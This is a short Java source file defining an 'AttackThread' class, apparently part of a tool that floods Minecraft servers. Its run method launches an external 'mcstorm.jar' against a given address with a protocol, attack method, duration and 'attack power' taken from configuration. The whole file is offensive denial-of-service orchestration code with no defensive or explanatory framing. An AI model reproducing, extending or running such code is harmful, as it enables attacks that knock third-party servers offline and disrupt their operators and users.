package net.servokio.q4mc.threads;

import net.servokio.q4mc.Config;
import net.servokio.q4mc.utils.CommandExecutor;

import java.io.IOException;

public class AttackThread extends Thread {
    private int id;
    private String addr;
    private int protocol;
    private String method;

    public AttackThread(int id, String addr, int protocol, String method) {
        super("AttackThread - id:" + id);
        this.id = id;
        this.addr = addr;
        this.protocol = protocol;
        this.method = method;
    }

    @Override
    public void run() {
        try {
            CommandExecutor.exec(String.format("start java -Xmx26G -server -jar ./mcstorm.jar %s %d %s %d %s", this.addr,
                    this.protocol, this.method, Config.ATTACK_TIME, Config.ATTACK_POWER));
        } catch (InterruptedException e) {
            System.out.println("Interrupted id: " + id);
            System.out.println(e.getMessage());
            e.printStackTrace();
        } catch (IOException e) {
            System.out.println("IOException id: " + id);
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }
}
